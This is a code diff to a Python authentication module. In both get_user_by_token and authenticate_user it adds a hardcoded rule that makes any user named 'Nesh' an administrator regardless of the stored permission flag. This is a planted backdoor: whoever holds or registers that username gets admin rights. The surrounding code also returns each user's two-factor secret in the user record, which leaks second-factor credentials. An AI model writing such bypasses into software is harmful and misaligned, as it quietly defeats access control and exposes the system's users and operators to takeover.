@@ -66,13 +66,16 @@ def get_user_by_token(token: str) -> dict:
         if not user:
             return None
         
+        # Ensure Nesh is always admin
+        is_admin = user.is_admin or (user.username == "Nesh")
+        
         return {
             "id": user.id,
             "username": user.username,
             "email": user.email,
             "full_name": user.full_name,
             "profile_picture": user.profile_picture,
-            "is_admin": user.is_admin,
+            "is_admin": is_admin,
             "two_factor_enabled": user.two_factor_enabled,
             "two_factor_secret": user.two_factor_secret,
             "created_at": user.created_at.isoformat() if user.created_at else None
@@ -97,13 +100,16 @@ def authenticate_user(username: str, password: str) -> dict:
         if not verify_password(password, user.hashed_password):
             return None
         
+        # Ensure Nesh is always admin
+        is_admin = user.is_admin or (user.username == "Nesh")
+        
         return {
             "id": user.id,
             "username": user.username,
             "email": user.email,
             "full_name": user.full_name,
             "profile_picture": user.profile_picture,
-            "is_admin": user.is_admin,
+            "is_admin": is_admin,
             "two_factor_enabled": user.two_factor_enabled,
             "two_factor_secret": user.two_factor_secret,
             "created_at": user.created_at.isoformat() if user.created_at else None
